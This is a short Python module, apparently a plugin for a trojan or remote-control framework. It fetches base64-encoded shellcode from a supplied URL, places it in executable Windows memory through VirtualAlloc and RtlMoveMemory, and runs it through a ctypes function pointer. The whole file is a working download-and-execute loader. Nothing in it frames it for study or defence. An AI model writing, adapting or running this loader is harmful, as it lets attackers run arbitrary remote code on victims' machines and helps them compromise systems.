import ctypes
import base64
from urllib import request

kernel32 = ctypes.windll.kernel32


def get_code(url):
    with request.urlopen(url) as response:
        shellcode = base64.decodebytes(response.read())

    return shellcode


def write_memory(buff):
    length = len(buff)

    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    kernel32.RtlMoveMemory.argtypes = (
        ctypes.c_void_p,
        ctypes.c_void_p,
        ctypes.c_size_t
    )

    ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)

    kernel32.RtlMoveMemory(ptr, buff, length)

    return ptr


def run(options):
    print('[*] Shellcode module.')

    url = options.get('url')

    if not url:
        print('[*] Fail!')

        return 0

    try:
        shellcode = get_code(url)
    except:
        print('[*] Fail!')

        return 0

    buffer = ctypes.create_string_buffer(shellcode)

    ptr = write_memory(buffer)

    shell_function = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
    shell_function()

    print('[*] Success!')
